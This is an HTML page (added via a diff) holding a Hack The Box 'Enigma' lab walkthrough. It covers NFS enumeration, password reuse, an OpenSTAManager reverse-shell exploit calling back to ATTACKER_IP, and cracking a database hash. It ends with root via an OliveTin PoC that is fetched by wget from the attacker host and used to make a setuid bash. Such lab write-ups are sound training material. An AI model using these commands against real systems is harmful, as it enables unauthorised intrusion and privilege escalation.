@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeup — penetration testing lab walkthrough.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <title>Hack The Box - Enigma — xlondra</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali:~$&nbsp;</span>
+                <span class="typed"></span><span class="cursor">▋</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+                <a href="#" class="nav-exit">exit</a>
+            </div>
+            <div class="hamburger-button">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor">
+                    <path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/>
+                </svg>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Hack The Box - Enigma</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date</strong> 2026-07-13</li>
+                    <li><strong>Platform</strong> HackTheBox</li>
+                    <li><strong>Difficulty</strong> Easy</li>
+                    <li><strong>Team</strong> <span class="team-badge red">Red Team</span></li>
+                    <li><strong>Link</strong> <a href="https://app.hackthebox.com/machines/Enigma" target="_blank" rel="noopener noreferrer">Open Lab ↗</a></li>
+                    <li><strong>Tags</strong> <span class="tag">Linux</span> <span class="tag">NFS</span></li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Summary</h2>
+
+                <p>Scanning the target network reveals several interesting services. We obtain email credentials by mounting an NFS share to a local directory and reading a PDF stored inside it. From there we pivot to another user who reuses the same password, which grants us admin access to a vulnerable version of a web panel and lets us drop a reverse shell as www-data. Next, we extract database users and escalate our privileges to the user haris, finally landing an interactive shell. We then discover a service running internally on port 1337 as root, which we reach through a reverse SSH tunnel. This service turns out to be vulnerable to command execution as root, ultimately giving us full root access.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+
+                <p>Let's start by scanning the target network.</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo nmap -p- -sV TARGET_IP">└─$ sudo nmap -p- -sV TARGET_IP</code></pre>
+</div>
+                <div class="command-wrapper output-block">
+    <div class="output-label">sudo nmap -p- -sV 10.129.68.219</div>
+    <pre><code data-copy-content="┌──(londra㉿kali)-[~]&#10;└─$ sudo nmap -p- -sV 10.129.68.219&#10;Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 15:51 +0200&#10;Nmap scan report for enigma.htb (10.129.68.219)&#10;Host is up (0.015s latency).&#10;Not shown: 65522 closed tcp ports (reset)&#10;PORT      STATE SERVICE  VERSION&#10;22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)&#10;80/tcp    open  http     nginx 1.24.0 (Ubuntu)&#10;110/tcp   open  pop3     Dovecot pop3d&#10;111/tcp   open  rpcbind  2-4 (RPC #100000)&#10;143/tcp   open  imap     Dovecot imapd (Ubuntu)&#10;993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)&#10;995/tcp   open  ssl/pop3 Dovecot pop3d&#10;2049/tcp  open  nfs_acl  3 (RPC #100227)&#10;38649/tcp open  mountd   1-3 (RPC #100005)&#10;38985/tcp open  nlockmgr 1-4 (RPC #100021)&#10;39685/tcp open  mountd   1-3 (RPC #100005)&#10;47971/tcp open  status   1 (RPC #100024)&#10;57181/tcp open  mountd   1-3 (RPC #100005)&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#10;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#10;Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds">┌──(londra㉿kali)-[~]
+└─$ sudo nmap -p- -sV 10.129.68.219
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 15:51 +0200
+Nmap scan report for enigma.htb (10.129.68.219)
+Host is up (0.015s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+110/tcp   open  pop3     Dovecot pop3d
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp   open  ssl/pop3 Dovecot pop3d
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+38649/tcp open  mountd   1-3 (RPC #100005)
+38985/tcp open  nlockmgr 1-4 (RPC #100021)
+39685/tcp open  mountd   1-3 (RPC #100005)
+47971/tcp open  status   1 (RPC #100024)
+57181/tcp open  mountd   1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds</code></pre>
+</div>
+                <p>Several interesting services came to light: 22 (<b>ssh</b>), 80 (<b>http</b>), 2049 (<b>N</b>etwork <b>F</b>ile <b>S</b>ystem), and a mail server. Nmap also reveals that the target's hostname is <b>enigma.htb</b>, so let's add it to <b>/etc/hosts</b>.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+
+                <p>Port 80 simply shows a template site with no back-end functionality. Let's therefore check which world-readable directories are exposed by the <b>NFS</b> share with the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="showmount -e enigma.htb">└─$ showmount -e enigma.htb</code></pre>
+</div>
+                <img src="images/nfsMounts.png" class="lab-image zoomable" alt="Enigma - show mounts">
+                <p>It shows a world-readable folder. We can try and mount it to a folder on our machine. Execute the following commands:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo mkdir /mnt/nfs">└─$ sudo mkdir /mnt/nfs</code></pre>
+</div>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt/nfs">└─$ sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt/nfs</code></pre>
+</div>
+                <p>Now if we list the content of <b>/mnt/nfs</b>:</p>
+                <img src="images/newPDF.png" class="lab-image zoomable" alt="Enigma - found PDF">
+                <p>Let's open the PDF file and examine its content. </p>
+                <img src="images/foundPassword.png" class="lab-image zoomable" alt="Enigma - Found Kevin Password">
+                <p>Not only does this show us Kevin's E-mail password, it also gives us the subdomain of the E-mail client. So let's add <b>mail001.enigma.htb</b> to <b>/etc/hosts</b> as well.</p>
+                <p>We can log in using the credentials we found and view Kevin's one and only E-mail.</p>
+                <img src="images/onlyEmail.png" class="lab-image zoomable" alt="">
+                <p>This E-mail does provide us with one key piece of information: another known user on the system. I poked around for a while and, after running out of options, tried reusing Kevin's password for Sarah, which worked...</p>
+                <p>And, just like Kevin, Sarah has one received E-mail, as shown in the image.</p>
+                <img src="images/sarahEmail.png" class="lab-image zoomable" alt="Enigma - Sarah E-mail">
+                <p>This E-mail provides us with another subdomain (<b>support_001.enigma.htb</b>) and admin credentials! Let's add the new subdomain to <b>/etc/hosts</b> as well. The new domain appears to host a platform called "OpenSTAManager", and we can log in using the credentials from the email:</p>
+                <img src="images/OpenSTAManager.png" class="lab-image zoomable" alt="">
+                <p>I searched around the application and found a backup feature, but it didn't yield any useful results. After searching for way to long, I checked the version of the OpenSTAManager:</p>
+                <img src="images/OpenManagerVersion.png" class="lab-image zoomable" alt="Enigma - OpenSTAManager Version">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>Some searching revealed that this version (<b>2.9.8</b>) of <b>OpenSTAManager</b> is vulnerable to <b>CVE-2026-38751</b>. I found a <a href="https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751" target="_blank" style="color: white">proof of concept</a> that exploits the vulnerability by abusing a file-upload feature. I used the exploit to gain a shell with the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="./openstamanager-rce-exploit --url http://support_001.enigma.htb --user admin --password ADMIN_PASSWORD --interactive --lhost ATTACKER_IP --lport 4444">└─$ ./openstamanager-rce-exploit --url http://support_001.enigma.htb --user admin --password ADMIN_PASSWORD --interactive --lhost ATTACKER_IP --lport 4444</code></pre>
+</div>
+                <img src="images/IntShell.png" class="lab-image zoomable" alt="Enigma - Interactive shell">
+                <p>As you can see, I got a reverse shell. I highly recommend pressing <b>CTRL + Z</b> and then running <b>stty raw -echo; fg</b>, as this will make the shell much easier to work with.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Post-Exploitation</h2>
+
+                <p>I read the contents of <b>/etc/passwd</b> and found that, of all the users with a home directory, "<b>haris</b>" is the only one with a login shell. So he'll be my target.</p>
+                <p>I listed the content of the OpenSTAManager root directory. </p>
+                <div class="command-wrapper output-block">
+    <div class="output-label">ls /var/www/html/openstamanager</div>
+    <pre><code data-copy-content="www-data@enigma:~/html/openstamanager$ ls&#10;CHANGELOG.md	   assets	       info.php		  pdfgen.php&#10;FUNDING.yml	   checksum.json       lib		  plugins&#10;KNOWN-ISSUES.md    composer.json       locale		  publiccode.yml&#10;LICENSE		   composer.lock       log.php		  rector.php&#10;README.md	   config	       logs		  reset.php&#10;REVISION	   config.example.php  mail.php		  settings.json&#10;SECURITY.md	   config.inc.php      manifest.json	  shared_editor.php&#10;VERSION		   config.php	       mariadb_10_x.json  shortcuts.php&#10;actions.php	   controller.php      modules		  src&#10;add.php		   core.php	       modules.json	  templates&#10;ajax.php	   cron.php	       mysql.json	  token_login.php&#10;ajax_complete.php  editor.php	       mysql_8_3.json	  update&#10;ajax_dataload.php  files	       node_modules	  vendor&#10;ajax_search.php    gulpfile.js	       oauth2.php	  view.php&#10;ajax_select.php    include	       oauth2_login.php   views.json&#10;api		   index.php	       package.json	  yarn.lock">www-data@enigma:~/html/openstamanager$ ls
+CHANGELOG.md	   assets	       info.php		  pdfgen.php
+FUNDING.yml	   checksum.json       lib		  plugins
+KNOWN-ISSUES.md    composer.json       locale		  publiccode.yml
+LICENSE		   composer.lock       log.php		  rector.php
+README.md	   config	       logs		  reset.php
+REVISION	   config.example.php  mail.php		  settings.json
+SECURITY.md	   config.inc.php      manifest.json	  shared_editor.php
+VERSION		   config.php	       mariadb_10_x.json  shortcuts.php
+actions.php	   controller.php      modules		  src
+add.php		   core.php	       modules.json	  templates
+ajax.php	   cron.php	       mysql.json	  token_login.php
+ajax_complete.php  editor.php	       mysql_8_3.json	  update
+ajax_dataload.php  files	       node_modules	  vendor
+ajax_search.php    gulpfile.js	       oauth2.php	  view.php
+ajax_select.php    include	       oauth2_login.php   views.json
+api		   index.php	       package.json	  yarn.lock</code></pre>
+</div>
+                <p><b>config.inc.php</b> stood out to me, as it had the highest chance of containing credentials, and indeed, it held database credentials.</p>
+                <img src="images/foundDBCreds.png" class="lab-image zoomable" alt="Enigma - Found DB creds">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Privilege Escalation (Haris)</h2>
+
+                <p>I tried to log in as <b>haris</b> using the password, but that didn't work. What did work, however, was logging into MySQL:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="mysql -u brollin -p'db_pass_here'">└─$ mysql -u brollin -p'db_pass_here'</code></pre>
+</div>
+                <p>Let's see what databases we have access to:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="show databases;">└─$ show databases;</code></pre>
+</div>
+                <img src="images/shownDBS.png" class="lab-image zoomable" alt="">
+                <p>Let's use the <b>openstamanager</b> database and list its tables:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="use openstamanager;">└─$ use openstamanager;</code></pre>
+</div>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="show tables;">└─$ show tables;</code></pre>
+</div>
+                <p>By default, OpenSTAManager stores its users in the <b>zz_users</b> table, so let's list the contents of zz_users using the following query:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="select * from zz_users;">└─$ select * from zz_users;</code></pre>
+</div>
+                <img src="images/foundHarisPass.png" class="lab-image zoomable" alt="Enigma - Found Haris Hash">
+                <p>Haris's password is hashed with bcrypt. This hash can be cracked using hashcat, so that's exactly what I did:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="hashcat -m 3200 hash.txt rockyou.txt">└─$ hashcat -m 3200 hash.txt rockyou.txt</code></pre>
+</div>
+                <img src="images/cracked.png" class="lab-image zoomable" alt="Enigma - Cracked Haris Hash">
+                <p>We cracked haris's hash, let's try and change to user haris using the found password:</p>
+                <img src="images/changedUser.png" class="lab-image zoomable" alt="Enigma - Cracked Haris Hash">
+                <p>We're now logged in as haris. To get an SSH connection as haris, we execute the following chain of commands:</p>
+                <p>On our attacking machine:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ssh-keygen -t ed25519 -f ./haris_key -N &quot;&quot;">└─$ ssh-keygen -t ed25519 -f ./haris_key -N &quot;&quot;</code></pre>
+</div>
+                <p>Copy the contents of <b>haris_key.pub</b> on the attacking machine, then use it to run the following command on the target:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="mkdir ~/.ssh &amp;&amp; echo &quot;haris_key.pub_content&quot; &gt; ~/.ssh/authorized_keys">└─$ mkdir ~/.ssh &amp;&amp; echo &quot;haris_key.pub_content&quot; &gt; ~/.ssh/authorized_keys</code></pre>
+</div>
+                <p>On our attacking machine:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="chmod 600 haris_key &amp;&amp; ssh -i haris_key haris@enigma.htb">└─$ chmod 600 haris_key &amp;&amp; ssh -i haris_key haris@enigma.htb</code></pre>
+</div>
+                <img src="images/loggedInToSSH.png" class="lab-image zoomable" alt="">
+                <p>The user flag is located in haris's home directory.</p>
+                <img src="images/userflag.png" class="lab-image zoomable" alt="Enigma - User Flag">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Privilege Escalation (Root)</h2>
+
+                <p>Once logged in with new privileges, it's important to always get some situational awareness. Part of that is checking which network services are running and listening. We can do so with the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ss -tulpn">└─$ ss -tulpn</code></pre>
+</div>
+                <p>One interesting finding is the service listening on port <b>1337</b>. It didn't come up in the Nmap scan, which means it's only accessible internally. Luckily, we can still reach it with a reverse SSH tunnel. Execute the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ssh -i haris_key -L 1337:127.0.0.1:1337 haris@enigma.htb">└─$ ssh -i haris_key -L 1337:127.0.0.1:1337 haris@enigma.htb</code></pre>
+</div>
+                <p>Now we're actually able to access that service locally by navigating to <b>http://127.0.0.1:1337</b>.</p>
+                <img src="images/OliveWithFetaShouldBeTheNorm.png" class="lab-image zoomable" alt="">
+                <p>We can see that OliveTin version 3000.10.0 is running on port 1337. Learning from my earlier mistake of only checking the software version half an hour in, I looked this one up right away. It turns out this version of OliveTin is vulnerable to <b>CVE-2026-27626</b>. Before potentially wasting time, though, let's first confirm which user runs OliveTin on the target:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ps aux | grep OliveTin">└─$ ps aux | grep OliveTin</code></pre>
+</div>
+                <img src="images/runnedByRoot.png" class="lab-image zoomable" alt="">
+                <p>The process is running as root, so any command it executes will run as root too. I found a good PoC <a href="https://github.com/0xh7ml/CVE-2026-27626-PoC" target="_blank" style="color: white">on GitHub</a>.</p>
+                <p>We need to get the PoC onto the target machine. Since most CTF boxes don't have internet access, we first download it to our attack box, then transfer it over. Execute the following chain of commands on the attacker machine:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="git clone https://github.com/0xh7ml/CVE-2026-27626-PoC.git">└─$ git clone https://github.com/0xh7ml/CVE-2026-27626-PoC.git</code></pre>
+</div>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="zip -r poc.zip CVE-2026-27626-PoC">└─$ zip -r poc.zip CVE-2026-27626-PoC</code></pre>
+</div>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo python3 -m http.server 80">└─$ sudo python3 -m http.server 80</code></pre>
+</div>
+                <p>And now on the target machine:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="cd ~ &amp;&amp; wget http://ATTACKER_IP/poc.zip &amp;&amp; unzip poc.zip &amp;&amp; cd CVE-2026-27626-PoC">└─$ cd ~ &amp;&amp; wget http://ATTACKER_IP/poc.zip &amp;&amp; unzip poc.zip &amp;&amp; cd CVE-2026-27626-PoC</code></pre>
+</div>
+                <p>Now lets run the exploit:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="python3 CVE-2026.27626.py -u http://127.0.0.1 -p 1337 --cmd &quot;cp /bin/bash /tmp/rootbash &amp;&amp; chmod 6755 /tmp/rootbash&quot;">└─$ python3 CVE-2026.27626.py -u http://127.0.0.1 -p 1337 --cmd &quot;cp /bin/bash /tmp/rootbash &amp;&amp; chmod 6755 /tmp/rootbash&quot;</code></pre>
+</div>
+                <p>Now, entering <code>/tmp/rootbash -p</code> gives us root access, and with it, permission to read <span class='path'>/root/root.txt</span>:</p>
+                <img src="images/gotRoot.png" class="lab-image zoomable" alt="Enigma - Root Access">
+                <p>That's it, we achieved root! I hope you liked it just as much as I did. Have a nice rest of your day!</p>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        Copyleft &copy; <span id="year"></span> &nbsp;·&nbsp; xlondra
+    </footer>
+</body>
+</html>
